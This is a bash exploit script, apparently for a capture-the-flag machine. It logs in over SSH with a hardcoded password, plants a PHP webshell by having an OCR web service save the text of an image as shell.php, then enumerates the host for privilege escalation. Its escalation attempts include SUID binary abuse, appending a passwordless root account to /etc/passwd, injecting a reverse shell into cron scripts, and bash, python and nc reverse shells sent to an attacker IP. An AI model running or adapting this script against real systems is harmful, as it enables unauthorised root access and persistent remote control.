#!/bin/bash

if [ $# -lt 1 ]; then
    echo "Usage: $0 <target_ip> [attacker_ip] [attacker_port]"
    echo "  If attacker_ip and port are given, the script will try to send a reverse shell."
    exit 1
fi

TARGET=$1
PASSWORD="JbhHDAEgXvri3!"
ATTACKER_IP=${2:-""}
ATTACKER_PORT=${3:-"4444"}

echo "[+] Creating shell.png with PHP webshell..."
python3 -c "
from PIL import Image, ImageDraw, ImageFont
img = Image.new('RGB', (800, 100), (255,255,255))
d = ImageDraw.Draw(img)
try:
    font = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf', 28)
except:
    font = ImageFont.load_default()
d.text((10, 30), '<?php system(\$_GET[\"c\"]); ?>', fill=(0,0,0), font=font)
img.save('shell.png')
"

echo "[+] Uploading to $TARGET..."
sshpass -p "$PASSWORD" scp shell.png "walter@$TARGET:/home/walter/"

echo "[+] Connecting via SSH and launching privilege escalation..."
sshpass -p "$PASSWORD" ssh -t "walter@$TARGET" << ENDSSH

    # ---- Prepare webshell ----
    B64=\$(base64 -w 0 ~/shell.png)
    OCR_ID=\$(curl -s -c /tmp/jar -b /tmp/jar -X POST http://localhost:8001/ \
      -u 'walter:JbhHDAEgXvri3!' \
      --data-urlencode "canvas_image=data:image/png;base64,\$B64" | \
      grep -oP 'ocr_id" value="\K[^"]+')
    curl -s -b /tmp/jar -X POST http://localhost:8001/ \
      -u 'walter:JbhHDAEgXvri3!' \
      --data "ocr_id=\$OCR_ID&filename=shell.php&save_output=1" > /dev/null
    WEBSHELL_URL="http://localhost:8001/saved/shell.php"
    echo "[+] Webshell ready at \$WEBSHELL_URL"

    # ---- Helper to run commands via webshell ----
    ws_cmd() {
        curl -s "\$WEBSHELL_URL?c=\$1" -u 'walter:JbhHDAEgXvri3!' 2>/dev/null
    }

    echo ""
    echo "[+] ========== ENUMERATION =========="

    # 1. Who is the web user?
    WEB_USER=\$(ws_cmd "whoami")
    WEB_ID=\$(ws_cmd "id")
    echo "[*] Webshell runs as: \$WEB_USER (\$WEB_ID)"

    # 2. Can we read /root/root.txt? (already known)
    ROOT_FLAG=\$(ws_cmd "cat /root/root.txt" | head -1)
    if [ -n "\$ROOT_FLAG" ]; then
        echo "[+] Root flag is readable: \$ROOT_FLAG"
    else
        echo "[-] Root flag not readable."
    fi

    # 3. Check sudo for web user
    echo "[*] Checking sudo rights for web user..."
    ws_cmd "sudo -n -l 2>/dev/null || echo 'no passwordless sudo'"

    # 4. All SUID binaries
    echo "[*] Listing all SUID binaries..."
    SUID_BINS=\$(ws_cmd "find / -perm -4000 -type f 2>/dev/null")
    echo "\$SUID_BINS"

    # 5. Writable files (especially /etc/passwd, /etc/sudoers, cron dirs)
    echo "[*] Checking writable sensitive files..."
    ws_cmd "ls -la /etc/passwd /etc/sudoers /etc/cron* /var/spool/cron 2>/dev/null | grep -v '^total'"

    # 6. Capabilities
    echo "[*] Checking capabilities..."
    ws_cmd "getcap -r / 2>/dev/null | head -10"

    # 7. Kernel version
    echo "[*] Kernel version:"
    ws_cmd "uname -a"

    echo ""
    echo "[+] ========== ATTEMPTING ROOT SHELL =========="

    # ---- Try 1: sudo with the known password (if walter is in sudoers) ----
    echo "[*] Trying sudo with password (walter)..."
    echo "$PASSWORD" | sudo -S whoami 2>/dev/null | grep -q root
    if [ \$? -eq 0 ]; then
        echo "[+] sudo works! Spawning root shell..."
        echo "$PASSWORD" | sudo -S /bin/bash -i
        exit 0
    fi

    # ---- Try 2: Exploit SUID binaries ----
    for bin in \$SUID_BINS; do
        echo "[*] Testing \$bin ..."
        case "\$bin" in
            */find)
                ws_cmd "find /root -name root.txt -exec /bin/sh -p \; -quit" 2>/dev/null && exit 0
                ;;
            */python*)
                ws_cmd "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash -i\")' 2>/dev/null" && exit 0
                ;;
            */perl*)
                ws_cmd "perl -e 'use POSIX; setuid(0); exec \"/bin/bash -i\"' 2>/dev/null" && exit 0
                ;;
            */bash|*/sh)
                ws_cmd "\$bin -p -c '/bin/bash -i' 2>/dev/null" && exit 0
                ;;
            */vim|*/nano|*/less|*/more)
                # These require interactive input – we can try to read a file or spawn shell via :!sh
                # For now, we just note it.
                echo "   (manual: run \$bin and then :!sh)"
                ;;
            */pkexec)
                ws_cmd "pkexec /bin/bash -i" 2>/dev/null && exit 0
                ;;
        esac
    done

    # ---- Try 3: Write to /etc/passwd if writable ----
    if ws_cmd "test -w /etc/passwd" 2>/dev/null; then
        echo "[+] /etc/passwd is writable! Adding root user..."
        ws_cmd "echo 'root2::0:0:root:/root:/bin/bash' >> /etc/passwd" 2>/dev/null
        if [ \$? -eq 0 ]; then
            echo "[+] Added root2 user with no password. Trying to su..."
            ws_cmd "su - root2 -c '/bin/bash -i'" 2>/dev/null && exit 0
        fi
    fi

    # ---- Try 4: Inject into writable cron script ----
    CRON_SCRIPTS=\$(ws_cmd "find /etc/cron* /var/spool/cron -type f -writable 2>/dev/null | head -1")
    if [ -n "\$CRON_SCRIPTS" ]; then
        echo "[+] Found writable cron script: \$CRON_SCRIPTS"
        ws_cmd "echo '#!/bin/bash\n/bin/bash -i > /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1' > \$CRON_SCRIPTS" 2>/dev/null
        echo "[+] Reverse shell payload written. Wait for cron to run..."
        # Optionally, we can wait, but we'll just continue.
    fi

    # ---- Try 5: Reverse shell via webshell (if attacker IP provided) ----
    if [ -n "$ATTACKER_IP" ]; then
        echo "[*] Trying to spawn reverse shell to $ATTACKER_IP:$ATTACKER_PORT..."
        # Try bash
        ws_cmd "/bin/bash -c '/bin/bash -i > /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1'" 2>/dev/null &
        # Try python
        ws_cmd "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$ATTACKER_IP\",$ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'" 2>/dev/null &
        # Try nc
        ws_cmd "nc -e /bin/bash $ATTACKER_IP $ATTACKER_PORT" 2>/dev/null &
        echo "[+] Payloads sent. Check your listener on $ATTACKER_PORT."
    fi

    echo ""
    echo "[!] Automated root shell failed. Here is the enumeration data for manual exploitation:"
    echo "SUID binaries:\$SUID_BINS"
    echo ""
    echo "Try: sudo -l (as walter) or exploit a SUID binary manually."
    echo "You can also use the webshell at \$WEBSHELL_URL"
    echo "Example: curl '\$WEBSHELL_URL?c=whoami' -u 'walter:JbhHDAEgXvri3!'"
    echo ""
    echo "--- USER FLAG ---"
    cat /home/walter/user.txt 2>/dev/null
    echo "-----------------"

    # Keep session open for manual commands
    exec /bin/bash -i

ENDSSH

echo "[+] Cleaning up..."
rm -f shell.png
echo "[+] Done."
